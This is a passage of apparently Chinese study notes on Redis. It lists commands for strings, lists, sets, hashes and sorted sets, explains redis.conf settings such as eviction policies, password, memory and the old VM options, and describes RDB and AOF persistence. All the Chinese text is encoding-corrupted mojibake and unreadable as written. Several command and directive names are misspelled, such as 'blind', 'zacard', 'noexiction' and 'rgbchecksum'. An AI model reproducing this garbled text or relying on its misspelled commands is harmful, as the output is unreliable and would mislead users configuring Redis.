KEY//ä¸€å®šè¦æ˜¯æ•°å­—ï¼Œè‡ªå¢è‡ªå‡ INCRBY/DECRBY KEY æ­¥é•¿ //å¤šæ­¥é€’å¢é€’å‡ getrange/setrange key index index //æ ¹æ®ç´¢å¼•å–å€¼è®¾ç½®å€¼ setex key ç§’é’Ÿ value //è®¾ç½®å€¼çš„æ—¶å€™è®¾ç½®è¿‡æœŸæ—¶é—´ setnx //set if not exist mset key1 value1 key2 value2 // è®¾ç½®å¤šä¸ªå€¼ mget/msetnx Listï¼šåˆ—è¡¨LPUSH list1 1 2 3 4 5 (ç±»ä¼¼æ ˆ) LRANGE list1 0 -1 5 4 3 2 1 lpop list1 &quot;5&quot; rpop list1 &quot;1&quot; RPUSH list2 1 2 3 4 5 LRANGE list2 0 -1 1 2 3 4 5 lpop list2 &quot;1&quot; rpop list2 &quot;5&quot; lindex //æŒ‰ç…§ç´¢å¼•ä¸‹æ ‡è·å¾—å…ƒç´ ï¼Œï¼ˆä»ä¸Šåˆ°ä¸‹ï¼‰ llen //é•¿åº¦ LREM KEY N Value //åˆ é™¤keyæ•°ç»„ä¸­çš„Nä¸ªValue LTRIM KEY å¼€å§‹index ç»“æŸindex //æˆªå–æŒ‡å®šèŒƒå›´çš„å€¼ååœ¨èµ‹å€¼ç»™key rpoplpush æºåˆ—è¡¨ ç›®çš„åˆ—è¡¨ //æŠŠæºåˆ—è¡¨çš„æœ€åº•çš„å€¼ç§»åŠ¨åˆ°ç›®çš„åˆ—è¡¨çš„æœ€ä¸Šé¢ lset key index value //æ ¹æ®æ•°ç»„ä¸‹æ ‡è®¾ç½®æˆvalue linsert key before/after å€¼1 å€¼2 //æŠŠå€¼2çš„å€¼æ’å…¥åˆ°keyæ•°ç»„å€¼1çš„å‰é¢/åé¢ Setï¼šé›†åˆsadd key value1ï¼Œvalue1ï¼Œvalue2 //åªä¼šè¿›å»ä¸é‡å¤çš„å€¼ smembers key value 0 -1 //æ‰“å°å…¨éƒ¨ sismember key value //åˆ¤æ–­valueæ˜¯å¦åœ¨keyé‡Œ scard //è·å–é›†åˆé‡Œé¢çš„å…ƒç´  srem key value //åˆ é™¤é›†åˆä¸­å…ƒç´  srandmember key //éšæœºå‡ºå‡ ä¸ªæ•° spop key //éšæœºå‡ºæ ˆ smove key1 key2 åœ¨key1é‡ŒæŸä¸ªå€¼ //å°†key1é‡Œçš„æŸä¸ªå€¼èµ‹ç»™key2 sdiff set1 set2 //å·®é›†ï¼Œset1é‡Œæœ‰çš„ï¼Œset2æ²¡æœ‰çš„ sinter set1 set2 //äº¤é›†ï¼Œéƒ½æœ‰çš„ sunion set1 set2 //å¹¶é›† Hash ï¼šå“ˆå¸Œvalueæ˜¯ä¸€ä¸ªé”®å€¼å¯¹ hset key &lt;key1,value1&gt; hget key key1 hmset KEY1 keyA valueA KEY2 keyB valueB hmgetall hdel KEY1 keyA HEXISTS KEY1 keyA //åˆ¤æ–­æ˜¯å¦å­˜åœ¨ hkeys/kvals KEY1 hincrby/hincrbyfloat KEY1 keyA æ­¥é•¿/æµ®ç‚¹æ•° //è‡ªå¢è‡ªå‡ hsetnx Zsetï¼ˆsorted setï¼‰ï¼šæœ‰åºé›†åˆåœ¨setåŸºç¡€ä¸Šï¼ŒåŠ ä¸€ä¸ªscoreå€¼ setæ˜¯ k1 v1 v2 v3 zsetæ˜¯ k1 score1 v1 score2 v2 zadd key k1 score1 v1 score2 v2 zrange key 0 -1 //åªä¼šæ‰“å°value zrange key 0 -1 withscores //ä¼šæ‰“å°v1ï¼Œscoreï¼Œv2ï¼Œscore zrangebyscore key å¼€å§‹score ç»“æŸscore // &quot;ï¼ˆ&quot; è¡¨ç¤ºä¸åŒ…å«ï¼Œ aï¼ˆ b è¡¨ç¤ºå¤§äºç­‰äºaï¼Œå°äºb zrangebyscore key å¼€å§‹score ç»“æŸscore withscore zrangebyscore key å¼€å§‹score ç»“æŸscore limit å¼€å§‹ä¸‹æ ‡æ­¥ å¤šå°‘æ­¥ zrem key scoreå¯¹åº”çš„value //åˆ é™¤å…ƒç´  zacard key //ç»Ÿè®¡keyé‡Œvalueçš„ä¸ªæ•° zcount key scoreåŒºé—´ zrank key value //è·å–ä¸‹æ ‡ zrevrank key value //è·å–åè½¬åçš„ä¸‹æ ‡ zrevrange key 0 -1//åè½¬é›†åˆ zrevrangebyscore key ç»“æŸscore å¼€å§‹score //åè½¬é›†åˆï¼Œindexä¹Ÿè¦åè½¬ é…ç½®æ–‡ä»¶Units1.é…ç½®å¤§å°å•ä½ï¼Œå¼€å¤´å®šä¹‰äº†ä¸€äº›åŸºæœ¬çš„åº¦é‡å•ä½ï¼Œåªæ”¯æŒbytesï¼Œä¸æ”¯æŒbit 2.å¯¹å¤§å°å†™ä¸æ•æ„Ÿ 1593308699248 INCLUDESå¯ä»¥é€šè¿‡includesåŒ…å«ï¼Œredis.confå¯ä»¥ä½œä¸ºæ€»é—¸,åŒ…å«å…¶ä»– 1593308936736 GENERALdaemonize é»˜è®¤ä¸ºno pidfile è¿›ç¨‹ç®¡é“idæ–‡ä»¶ port é»˜è®¤ç«¯å£ tcp-backlog,backlog 511æ˜¯ä¸€ä¸ªè¿æ¥é˜Ÿåˆ—,åœ¨é«˜å¹¶å‘ç¯å¢ƒä¸‹ä½ éœ€è¦ä¸€ä¸ªé«˜backlogå€¼æ¥é¿å…æ…¢å®¢æˆ·ç«¯è¿æ¥é—®é¢˜ bind ç«¯å£åŠç½‘å¡çš„ç»‘å®š timeout 0 å½“ç³»ç»Ÿç©ºé—²ä¸€æ®µæ—¶é—´åä¸­æ–­ Tcp-keepalive å•ä½ä¸ºç§’,è®¾ç½®ä¸º0åˆ™ä¸ä¼šè¿›è¡ŒKeepaliveæ£€æµ‹ loglevel notice æ—¥å¿—çº§åˆ« logfile æ—¥å¿—æ–‡ä»¶ syslog-enabled æ˜¯å¦æŠŠæ—¥å¿—è¾“å‡ºåˆ°syslogä¸­ syslog-ident æŒ‡å®šsyslogé‡Œçš„æ—¥å¿—æ ‡å¿— syslog-facility æŒ‡å®šsyslogè®¾å¤‡,å€¼å¯ä»¥æ˜¯USERæˆ–LOCAL0-LOCAL7 databases é»˜è®¤æœ‰16ä¸ªåº“ 1593309132453 SECURITYconfig get requirepass config set requirepass &quot;123456&quot; //ç«‹å³ç”Ÿæ•ˆ è®¿é—®ä»»ä½•å‘½ä»¤å‰ä½¿ç”¨ auth 123456 LIMITmaxclients 10000 å…è®¸10000äººè¿æ¥ maxmemory maxmemory-policy noexiction ç¼“å­˜è¿‡æœŸæ¸…æ´ç­–ç•¥ ,é»˜è®¤æ°¸ä¸è¿‡æœŸ volatile-lru:ä½¿ç”¨LRUç®—æ³•ç§»é™¤key,åªå¯¹è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”® allkeys-lru:ä½¿ç”¨LRUç®—æ³•ç§»é™¤key volatile-random:åœ¨è¿‡æœŸé›†åˆä¸­ç§»é™¤éšæœºçš„key,åªå¯¹è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”® allkeys-random:ç§»é™¤éšæœºçš„key volatile-ttl:ç§»é™¤é‚£äº›TTLå€¼æœ€å°çš„key,å³é‚£äº›æœ€è¿‘è¦è¿‡æœŸçš„key noexiction :ä¸è¿›è¡Œç§»é™¤.é’ˆå¯¹å†™æ“ä½œ,åªæ˜¯è¿”å›é”™è¯¯ä¿¡æ¯ LRUç®—æ³•:æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„ Maxmemory-samples è®¾ç½®æ ·æœ¬æ•°é‡,LRUç®—æ³•å’Œæœ€å°TTLç®—æ³•éƒ½å¹¶éæ˜¯ç²¾ç¡®çš„ç®—æ³•,è€Œæ˜¯ä¼°ç®—å€¼,æ‰€ä»¥ä½ å¯ä»¥è®¾ç½®æ ·æœ¬çš„å¤§å°,redisé»˜è®¤ä¼šæ£€æŸ¥è¿™ä¹ˆå¤šä¸ªkeyå¹¶é€‰æ‹©å…¶ä¸­LRUçš„é‚£ä¸ª; å¸¸ç”¨é…ç½® redisé»˜è®¤ä¸æ˜¯ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œ,å¯ä»¥é€šè¿‡è¯¥é…ç½®é¡¹ä¿®æ”¹,ä½¿ç”¨yeså¯åŠ¨å®ˆæŠ¤è¿›ç¨‹ daemonize no å½“Redisä»¥å®ˆæŠ¤è¿›ç¨‹æ–¹å¼è¿è¡Œæ—¶,Redisé»˜è®¤ä¼šæŠŠpidå†™å…¥/var/run/redis.pidæ–‡ä»¶,å¯ä»¥é€šè¿‡pidfileæŒ‡å®š pid /var/run/redis.pid æŒ‡å®šredisç›‘å¬ç«¯å£,é»˜è®¤ç«¯å£ä¸º6379port 6379 ç»‘å®šçš„ä¸»æœºåœ°å€blind 127.0.0.1 å½“å®¢æˆ·ç«¯é—²ç½®å¤šé•¿æ—¶é—´åå…³é—­è¿æ¥,å¦‚æœæŒ‡å®šä¸º0,è¡¨ç¤ºå…³é—­è¯¥åŠŸèƒ½timeout 300 æŒ‡å®šæ—¥å¿—è®°å½•çº§åˆ«,Redisæ€»å…±æ”¯æŒå››ä¸ªçº§åˆ«,debugã€verboseã€noticeã€warningï¼Œé»˜è®¤ä¸ºverboseloglevel verbose æ—¥å¿—è®°å½•æ–¹å¼ï¼Œé»˜è®¤ä¸ºæ ‡å‡†è¾“å‡ºï¼Œå¦‚æœé…ç½®Redisä¸ºå®ˆæŠ¤è¿›ç¨‹æ–¹å¼ï¼Œè€Œè¿™é‡Œåˆé…ç½®ä¸ºæ—¥å¿—è®°å½•æ–¹å¼ä¸ºæ ‡å‡†è¾“å‡ºï¼Œåˆ™æ—¥å¿—å°†ä¼šå‘é€ç»™/dev/null logfile stdout è®¾ç½®æ•°æ®åº“çš„æ•°é‡ï¼Œé»˜è®¤æ•°æ®åº“ä¸º0ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤åœ¨è¿æ¥ä¸ŠæŒ‡å®šæ•°æ®åº“id databases 16 æŒ‡å®šåœ¨å¤šé•¿æ—¶é—´å†…ï¼Œæœ‰å¤šå°‘æ¬¡æ›´æ–°æ“ä½œï¼Œå°±å°†æ•°æ®åŒæ­¥åˆ°æ•°æ®æ–‡ä»¶ï¼Œå¯ä»¥å¤šä¸ªæ¡ä»¶é…åˆ save &lt;seconds&gt; &lt;changes&gt; Redisé»˜è®¤é…ç½®æ–‡ä»¶ä¸­æä¾›äº†ä¸‰ä¸ªæ¡ä»¶: save 900 1 save 300 10 save 60 10000 æŒ‡å®šå­˜å‚¨è‡³æœ¬åœ°æ•°æ®åº“æ—¶æ˜¯å¦å‹ç¼©æ•°æ®ï¼Œé»˜è®¤ä¸ºyesï¼ŒRedisé‡‡ç”¨LZFå‹ç¼©ï¼Œå¦‚æœä¸ºäº†èŠ‚çœCPUæ—¶é—´ï¼Œå¯ä»¥å…³é—­è¯¥é€‰é¡¹ï¼Œä½†ä¼šå¯¼è‡´æ•°æ®åº“æ–‡ä»¶å˜çš„å·¨å¤§ rdbcompression yes æŒ‡å®šæœ¬åœ°æ•°æ®åº“æ–‡ä»¶åï¼Œé»˜è®¤ä¸ºdump.rdb dbfilename dump.rdb æŒ‡å®šæœ¬åœ°æ•°æ®åº“å­˜æ”¾ç›®å½• dir ./ è®¾ç½®å½“æœ¬æœºä¸ºslavæœåŠ¡æ—¶ï¼Œè®¾ç½®masteræœåŠ¡çš„IPåœ°å€åŠç«¯å£ï¼Œåœ¨Rediså¯åŠ¨æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨ä»masterè¿›è¡Œæ•°æ®åŒæ­¥ slaveof &lt;masterip&gt; &lt;masterport&gt; å½“masteræœåŠ¡å…ˆè®¾ç½®äº†å¯†ç ä¿æŠ¤ï¼ŒslavæœåŠ¡è¿æ¥masterçš„å¯†ç  masterauth &lt;master-password&gt; è®¾ç½®Redisè¿æ¥å¯†ç ï¼Œå¦‚æœé…ç½®äº†è¿æ¥å¯†ç ï¼Œå®¢æˆ·ç«¯åœ¨è¿æ¥Redisæ—¶éœ€è¦é€šè¿‡AUTH å‘½ä»¤æä¾›å¯†ç ï¼Œé»˜è®¤å…³é—­ requirepass foobared è®¾ç½®åŒä¸€æ—¶é—´æœ€å¤§å®¢æˆ·ç«¯è¿æ¥æ•°ï¼Œé»˜è®¤æ— é™åˆ¶ï¼ŒRediså¯ä»¥åŒæ—¶æ‰“å¼€çš„å®¢æˆ·ç«¯è¿æ¥æ•°ä¸ºRedisè¿›ç¨‹å¯ä»¥æ‰“å¼€çš„æœ€å¤§æ–‡ä»¶æè¿°ç¬¦ï¼Œå¦‚æœè®¾ç½® maxclients 0ï¼Œè¡¨ç¤ºä¸ä½œé™åˆ¶ã€‚å½“å®¢æˆ·ç«¯è¿æ¥æ•°åˆ°è¾¾é™åˆ¶æ—¶ï¼ŒRedisä¼šå…³é—­æ–°çš„è¿æ¥å¹¶å‘å®¢æˆ·ç«¯è¿”å›max numbers of clients reached é”™è¯¯ä¿¡æ¯ maxclients 128 æŒ‡å®šRedisæœ€å¤§å†…å­˜é™åˆ¶ï¼ŒRedisåœ¨å¯åŠ¨æ—¶ä¼šæŠŠæ•°æ®åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè¾¾åˆ°æœ€å¤§å†…å­˜åï¼Œredisä¼šå…ˆå°è¯•æ¸…é™¤å·²åˆ°æœŸæˆ–å³å°†åˆ°æœŸçš„Keyï¼Œå½“æ­¤æ–¹æ³•å¤„ç†åï¼Œä»ç„¶åˆ°è¾¾æœ€å¤§å†…å­˜è®¾ç½®ï¼Œå°†æ— æ³•å†è¿›è¡Œå†™å…¥æ“ä½œï¼Œä½†ä»ç„¶å¯ä»¥è¿›è¡Œè¯»å–æ“ä½œã€‚Redisæ–°çš„vmæœºåˆ¶ï¼Œä¼šæŠŠkeyå­˜æ”¾å†…å­˜ï¼Œvalueä¼šå­˜æ”¾åœ¨swapåŒºã€‚ maxmemory &lt;bytes&gt; æŒ‡å®šæ˜¯å¦åœ¨æ¯æ¬¡æ›´æ–°æ“ä½œåè¿›è¡Œæ—¥å¿—è®°å½•ã€‚Redisåœ¨é»˜è®¤æƒ…å†µä¸‹æ—¶å¼‚æ­¥çš„æŠŠæ•°æ®å†™å…¥ç£ç›˜ï¼Œå¦‚æœä¸å¼€å¯ï¼Œå¯èƒ½ä¼šåœ¨æ–­ç”µæ—¶å¯¼è‡´ä¸€æ®µæ—¶é—´å†…çš„æ•°æ®ä¸¢å¤±ã€‚å› ä¸ºredisæœ¬èº«åŒæ­¥æ•°æ®æ–‡ä»¶æ—¶æŒ‰saveæ¡ä»¶æ¥åŒæ­¥çš„ï¼Œæ‰€ä»¥æœ‰çš„æ•°æ®ä¼šåœ¨ä¸€æ®µæ—¶é—´å†…åªå­˜åœ¨å†…å­˜ä¸­ã€‚é»˜è®¤ä¸ºno appendonly no æŒ‡å®šæ›´æ–°æ—¥å¿—æ–‡ä»¶åï¼Œé»˜è®¤ä¸ºappendonly.aof appendfilename appendonly.aof æŒ‡å®šæ›´æ–°æ—¥å¿—æ¡ä»¶ï¼Œå…±æœ‰3ä¸ªå¯é€‰å€¼ï¼š appendfsync everysec no: è¡¨ç¤ºç­‰æ“ä½œç³»ç»Ÿè¿›è¡Œæ•°æ®ç¼“å­˜åŒæ­¥åˆ°ç£ç›˜ï¼ˆå¿«ï¼‰ alwaysï¼šè¡¨ç¤ºæ¯æ¬¡æ›´æ–°æ“ä½œåæ‰‹åŠ¨è°ƒç”¨fsync()å°†æ•°æ®å†™åˆ°ç£ç›˜ï¼ˆæ…¢ï¼Œå®‰å…¨ï¼‰ everysecï¼šè¡¨ç¤ºæ¯ç§’åŒæ­¥ä¸€æ¬¡ï¼ˆæŠ˜ä¸­ï¼Œé»˜è®¤å€¼ï¼‰ æŒ‡å®šæ˜¯å¦å¯ç”¨è™šæ‹Ÿå†…å­˜æœºåˆ¶ï¼Œé»˜è®¤ä¸ºnoã€‚VMæœºåˆ¶å°†æ•°æ®åˆ†é¡µå­˜æ”¾ï¼Œæœ‰Rediså°†è®¿é—®é‡è¾ƒå°‘çš„é¡µå³å†·æ•°æ®swapåˆ°ç£ç›˜ä¸Šï¼Œè®¿é—®å¤šçš„é¡µé¢ç”±ç£ç›˜æ¢å‡ºåˆ°å†…å­˜ä¸­ vm-enabled no è™šæ‹Ÿå†…å­˜æ–‡ä»¶è·¯å¾„,é»˜è®¤å€¼ä¸º/tmp/redis.swap vm-swap-file /tmp/redis.swap å°†æ‰€æœ‰å¤§äºvm-max-memoryçš„æ•°æ®å­˜å…¥è™šæ‹Ÿå†…å­˜ï¼Œæ— è®ºvm-max-memoryè®¾ç½®å¤šå°ï¼Œæ‰€æœ‰ç´¢å¼•æ•°æ®éƒ½æ˜¯å†…å­˜å­˜å‚¨çš„(Redisçš„ç´¢å¼•æ•°æ® å°±æ˜¯keys)ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå½“vm-max-memoryè®¾ç½®ä¸º0çš„æ—¶å€™ï¼Œå…¶å®æ˜¯æ‰€æœ‰valueéƒ½å­˜åœ¨äºç£ç›˜ã€‚é»˜è®¤ä¸º0 vm-max-memory 0 Redis swapæ–‡ä»¶åˆ†æˆäº†å¾ˆå¤špageï¼Œä¸€ä¸ªå¯¹è±¡å¯ä»¥ä¿å­˜åœ¨å¤šä¸ªpageä¸Šé¢ï¼Œä½†ä¸€ä¸ªpageä¸Šä¸èƒ½è¢«å¤šä¸ªå¯¹è±¡å…±äº«ï¼Œvm-page-sizeæ˜¯è¦æ ¹æ®å­˜å‚¨çš„æ•°æ®å¤§å°æ¥è®¾å®šçš„ï¼Œä½œè€…å»ºè®®å¦‚æœå­˜å‚¨å¾ˆå¤šå°å¯¹è±¡ï¼Œpageå¤§å°æœ€å¥½è®¾ç½®ä¸º32æˆ–è€…64bytes;å¦‚æœå­˜å‚¨å¾ˆå¤§çš„å¯¹è±¡ï¼Œåˆ™å¯ä»¥ä½¿ç”¨æ›´å¤§çš„pageï¼Œå¦‚æœä¸ç¡®å®šï¼Œå°±ä½¿ç”¨é»˜è®¤å€¼ vm-page-size 32 è®¾ç½®swapæ–‡ä»¶ä¸­çš„pageæ•°é‡ï¼Œç”±äºé¡µè¡¨(ä¸€ç§è¡¨ç¤ºé¡µé¢ç©ºé—²æˆ–ä½¿ç”¨çš„bitmap)æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œåœ¨ç£ç›˜ä¸Šæ¯8ä¸ªpageå°†æ¶ˆè€—1bytesçš„å†…å­˜ vm-pages 134217728 è®¾ç½®è®¿é—®swapæ–‡ä»¶çš„çº¿ç¨‹æ•°ï¼Œæœ€å¥½ä¸è¦è¶…è¿‡æœºå™¨çš„æ ¸æ•°ï¼Œå¦‚æœè®¾ç½®ä¸º0ï¼Œé‚£ä¹ˆæ‰€æœ‰å¯¹swapæ–‡ä»¶çš„æ“ä½œéƒ½æ˜¯ä¸²è¡Œçš„ï¼Œå¯èƒ½ä¼šé€ æˆæ¯”è¾ƒé•¿æ—¶é—´çš„å»¶è¿Ÿã€‚é»˜è®¤å€¼ä¸º4 vm-max-threads 4 è®¾ç½®åœ¨å‘å®¢æˆ·ç«¯åº”ç­”æ—¶ï¼Œæ˜¯å¦æŠŠè¾ƒå°çš„åŒ…å«å¹¶ä¸ºä¸€ä¸ªåŒ…å‘é€ï¼Œé»˜è®¤ä¸ºå¼€å¯ glueoutputbuf yes æŒ‡å®šåœ¨è¶…è¿‡ä¸€å®šçš„æ•°é‡æˆ–è€…æœ€å¤§çš„å…ƒç´ è¶…è¿‡æŸä¸€ä¸´ç•Œå€¼æ—¶ï¼Œé‡‡ç”¨ä¸€ç§ç‰¹æ®Šçš„å“ˆå¸Œç®—æ³• hash-max-zipmap-entries 64 hash-max-zipmap-value 512 æŒ‡å®šæ˜¯å¦æ¿€æ´»é‡ç½®å“ˆå¸Œï¼Œé»˜è®¤ä¸ºå¼€å¯ activerehashing yes æŒ‡å®šåŒ…å«å…¶ä»–çš„é…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸»æœºä¸Šå¤šä¸ªRediså®ä¾‹ä¹‹é—´åŒä¸€ä»½é…ç½®æ–‡ä»¶ï¼Œè€ŒåŒæ—¶å„ä¸ªå®ä¾‹åˆæ‹¥æœ‰è‡ªå·±çš„ç‰¹å®šé…ç½®æ–‡ä»¶ inclue /path/to.local,conf RedisæŒä¹…åŒ–RDB åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…å°†å†…å­˜ä¸­çš„æ•°æ®é›†å¿«ç…§å†™å…¥ç£ç›˜ï¼Œå³Snapshotå¿«ç…§ï¼Œå®ƒæ¢å¤æ—¶æ˜¯å°†å¿«ç…§æ–‡ä»¶ç›´æ¥è¯»åˆ°å†…å­˜é‡Œ æ˜¯ä»€ä¹ˆï¼ŸRedisä¼šå•ç‹¬åˆ›å»º(fork)ä¸€ä¸ªå­è¿›ç¨‹æ¥è¿›è¡ŒæŒä¹…åŒ–ï¼Œä¼šå…ˆå°†æ•°æ®å†™å…¥åˆ°ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œå¾…æŒä¹…åŒ–è¿‡ç¨‹éƒ½ç»“æŸäº†ï¼Œå†ç”¨è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œæ›¿æ¢ä¸Šæ¬¡æŒä¹…åŒ–å¥½çš„æ–‡ä»¶ã€‚ æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸»è¿›ç¨‹æ˜¯ä¸è¿›è¡Œä»»ä½•IOæ“ä½œçš„ï¼Œè¿™å°±ç¡®ä¿äº†æé«˜çš„æ€§èƒ½ã€‚ å¦‚æœéœ€è¦è¿›è¡Œå¤§è§„æ¨¡æ•°æ®çš„æ¢å¤ï¼Œä¸”å¯¹äºæ•°æ®æ¢å¤çš„å®Œæ•´æ€§ä¸æ˜¯éå¸¸æ•æ„Ÿï¼Œé‚£RDBæ–¹æ³•è¦æ¯”AOFæ–¹å¼æ›´åŠ çš„é«˜æ•ˆã€‚ RDBçš„ç¼ºç‚¹æ˜¯æœ€åä¸€æ¬¡æŒä¹…åŒ–åçš„æ•°æ®å¯èƒ½ä¸¢å¤±ã€‚ Fork Forkçš„ä½œç”¨æ˜¯å¤åˆ¶ä¸€ä¸ªä¸å½“å‰è¿›ç¨‹ä¸€æ ·çš„è¿›ç¨‹ã€‚æ–°è¿›ç¨‹çš„æ‰€æœ‰æ•°æ®ï¼ˆå˜é‡ã€ç¯å¢ƒå˜é‡ã€ç¨‹åºè®¡æ•°å™¨ç­‰ï¼‰ æ•°å€¼éƒ½å’ŒåŸè¿›ç¨‹ä¸€è‡´ï¼Œä½†æ˜¯æ˜¯ä¸€ä¸ªå…¨æ–°çš„è¿›ç¨‹ï¼Œå¹¶ä½œä¸ºåŸè¿›ç¨‹çš„å­è¿›ç¨‹ RDBä¿å­˜çš„æ˜¯dump.rdbæ–‡ä»¶, å…ˆæ‹·è´ä¸€ä»½rdbï¼Œåˆ é™¤åŸrdbï¼Œå†é‡å‘½åä¸ºdump.rdbï¼Œå³å¯æ¢å¤ é…ç½®æ–‡ä»¶çš„ä½ç½®####SNAPSHOTsave ç§’é’Ÿ å†™æ“ä½œæ¬¡æ•° ç¦ç”¨ save â€œâ€ æŒ‡å®šå­˜å‚¨è‡³æœ¬åœ°æ•°æ®åº“æ—¶æ˜¯å¦å‹ç¼©æ•°æ®ï¼Œé»˜è®¤ä¸ºyesï¼ŒRedisé‡‡ç”¨LZFå‹ç¼©ï¼Œå¦‚æœä¸ºäº†èŠ‚çœCPUæ—¶é—´ï¼Œå¯ä»¥å…³é—­è¯¥é€‰é¡¹ï¼Œä½†ä¼šå¯¼è‡´æ•°æ®åº“æ–‡ä»¶å˜çš„å·¨å¤§ rdbcompression yes stop-writes-on-bgsave-error yes å¦‚æœåå°åœ¨saveæ“ä½œå‡ºç°é”™è¯¯çš„æ—¶å€™ï¼Œåœæ­¢å†™å…¥ å¦‚æœé…ç½®ä¸ºnoï¼Œè¡¨ç¤ºä½ ä¸åœ¨ä¹æ•°æ®ä¸ä¸€è‡´æˆ–è€…æœ‰å…¶ä»–çš„æ‰‹æ®µå‘ç°å’Œæ§åˆ¶ rgbchecksum yes ##æ˜¯å¦æ ¡éªŒrdbæ–‡ä»¶ åœ¨å­˜å‚¨å¿«ç…§åï¼Œè¿˜å¯ä»¥è®©Redisä½¿ç”¨CRCç®—æ³•æ¥è¿›è¡Œæ•°æ®æ ¡éªŒï¼Œä½†æ˜¯è¿™æ ·åšä¼šå¢åŠ å¤§çº¦10%çš„æ€§èƒ½æ¶ˆè€—ï¼Œ å¦‚æœå¸Œæœ›è·å–åˆ°æœ€å¤§çš„æ€§èƒ½æå‡ï¼Œå¯ä»¥å…³é—­æ­¤åŠŸèƒ½ã€‚ è§¦å‘RDBå¿«ç…§ å‘½ä»¤ save æ‰‹åŠ¨ä¿å­˜ saveåªç®¡ä¿å­˜ï¼Œå…¶ä»–ä¸ç®¡ï¼Œå…¨éƒ¨é˜»å¡ bgsave Redisä¼šåœ¨åå°å¼‚æ­¥è¿›è¡Œå¿«ç…§æ“ä½œï¼Œå¿«ç…§åŒæ—¶è¿˜å¯ä»¥å“åº”å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¯ä»¥é€šè¿‡lastsaveå‘½ä»¤è·å¾—æœ€åä¸€æ¬¡æˆåŠŸæ‰§è¡Œå¿«ç…§çš„æ—¶é—´ æ‰§è¡Œflushallå‘½ä»¤ï¼Œä¹Ÿä¼šäº§ç”Ÿdump.rdbæ–‡ä»¶ï¼Œä½†é‡Œé¢æ˜¯ç©ºçš„ï¼Œæ— æ„ä¹‰ã€‚ config get dirè·å–ç›®å½• åœæ­¢ åŠ¨æ€æ‰€æœ‰åœæ­¢RDBä¿å­˜è§„åˆ™çš„æ–¹æ³•ï¼šredis-cli config set save â€œâ€ ä¼˜åŠ¿1.é€‚åˆå¤§è§„æ¨¡çš„æ•°æ®æ¢å¤ 2.å¯¹æ•°æ®å®Œæ•´æ€§å’Œä¸€è‡´æ€§è¦æ±‚ä¸é«˜ åŠ£åŠ¿1.åœ¨ä¸€å®šé—´éš”æ—¶é—´åšä¸€æ¬¡å¤‡ä»½ï¼Œæ‰€æœ‰å¦‚æœredisæ„å¤–downæ‰çš„è¯ï¼Œå°±ä¼šä¸¢å¤±æœ€åä¸€æ¬¡å¿«ç…§åçš„æ‰€æœ‰ä¿®æ”¹ 2.forkçš„æ—¶å€™ï¼Œå†…å­˜ä¸­çš„æ•°æ®è¢«å…‹éš†äº†ä¸€ä»½ï¼Œå¤§è‡´2å€çš„è†¨èƒ€æ€§éœ€è¦è€ƒè™‘ æ€»ç»“ å†…å­˜ä¸­çš„ rdbSave ç£ç›˜ä¸­çš„ æ•°æ®å¯¹è±¡ ----------ã€‹ RDBæ–‡ä»¶ rdbload RDBæ˜¯ä¸€ä¸ªéå¸¸ç´§å‡‘çš„æ–‡ä»¶ RDBåœ¨ä¿å­˜æ–‡ä»¶æ—¶çˆ¶è¿›ç¨‹å”¯ä¸€è¦åšçš„å°±æ˜¯forkå‡ºä¸€ä¸ªå­è¿›ç¨‹æ¥åšï¼Œæ¥ä¸‹æ¥çš„å·¥ä½œå…¨éƒ¨ç”±å­è¿›ç¨‹æ¥åšï¼Œ çˆ¶è¿›ç¨‹ä¸éœ€è¦å†åšå…¶ä»–IOæ“ä½œï¼Œæ‰€ä»¥RDBæŒä¹…åŒ–æ–¹å¼å¯ä»¥æœ€å¤§åŒ–redisçš„æ€§èƒ½ ä¸AOFç›¸æ¯”ï¼Œåœ¨æ¢å¤å¤§çš„æ•°æ®é›†çš„æ—¶å€™ï¼ŒRDBæ–¹å¼ä¼šæ›´å¿«ä¸€äº›ã€‚ æ•°æ®ä¸¢å¤±é£é™©å¤§ RDBéœ€è¦ç»å¸¸forkå­è¿›ç¨‹æ¥ä¿å­˜æ•°æ®é›†åˆ°ç¡¬ç›˜ä¸Šï¼Œå½“æ•°æ®é›†æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼Œforkçš„è¿‡ç¨‹æ˜¯éå¸¸è€—æ—¶çš„ï¼Œå¯èƒ½ä¼šå¯¼è‡´Redisåœ¨ä¸€äº›æ¯«ç§’çº§ä¸èƒ½å“åº”å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚ RedisæŒä¹…åŒ–ä¹‹AOF ä»¥æ—¥å¿—çš„å½¢å¼æ¥è®°å½•æ¯ä¸ªå†™æ“ä½œï¼Œå°†Redisæ‰§è¡Œè¿‡çš„æ‰€æœ‰å†™æŒ‡ä»¤è®°å½•ä¸‹æ¥ï¼ˆè¯»æ“ä½œä¸è®°å½•ï¼‰ï¼Œåªè®¸è¿½åŠ æ–‡ä»¶ä½†ä¸å¯ä»¥æ”¹å†™æ–‡ä»¶ï¼Œrediså¯åŠ¨ä¹‹åˆä¼šè¯»å–è¯¥æ–‡ä»¶é‡æ–°æ„å»ºæ•°æ®ï¼Œæ¢è¨€ä¹‹ï¼Œredisé‡å¯çš„è¯å°±æ ¹æ®æ—¥å¿—æ–‡ä»¶çš„å†…å®¹å°†å†™æŒ‡ä»¤ä»å‰åˆ°åæ‰§è¡Œä¸€æ¬¡ä»¥å®Œæˆæ•°æ®çš„æ¢å¤å·¥ä½œ AOFä¿å­˜çš„æ˜¯appendonly.aofæ–‡ä»¶ #####appendonlyæ¢å¤ï¼šåˆ é™¤dump.rdbï¼Œvim appendonly.aofï¼Œåˆ 